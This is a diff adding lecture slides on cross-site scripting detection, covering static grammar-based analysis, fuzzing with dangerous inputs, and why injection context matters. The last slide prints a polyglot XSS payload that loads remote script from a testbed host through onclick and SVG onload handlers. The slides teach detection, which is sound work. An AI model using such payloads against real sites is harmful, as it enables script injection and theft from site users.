@@ -1,0 +1,75 @@
+
+### XSS detection 
+
+
+* static/dynamic program analysis
+* trying ‘dangerous’ inputs
+
+
+### static program analysis example  {.smaller}
+
+
+* Wasserman and Su, ‘`Static Detection of Cross-Site Scripting Vulnerabilitiues (ICSE’08)
+* try to summarize program string operations as context-free grammar (see DMT2) 
+
+   * summary: context-free grammar = string building rules
+
+* mark where user input is in that grammar
+* try to solve if way for context-free grammar to include script tag, etc. with user input
+
+
+###  
+
+
+![](/web/wassermann-fig1-2){}
+
+
+### dangerous inputs 
+
+
+* just try to put code in inputs
+* see if browser runs it… 
+<hr class="vspace" />
+* relatively simple, but…
+
+
+### dangerous inputs: context  {.smaller}
+
+
+
+* problem: need to match context!
+ 
+```
+<a href=USER INPUT>
+<style type="text/css"
+p.some-class {
+    font: "USER INPUT", Helvetica, serif;
+}
+</style>
+<script>
+if (x == "USER INPUT") {
+    ...
+}
+</script>
+
+```
+
+
+### a recent paper 
+
+
+![](/web/kirchner-title){}
+
+
+### example input 
+
+(with added newlines) 
+```
+jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=
+import('http://testbed:8080/xss.js') )//%0D%0A
+%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>
+\x3csVg/
+<sVg/oNloAd=import('http://testbed:8080/xss.js')//>\x3e
+
+```
+
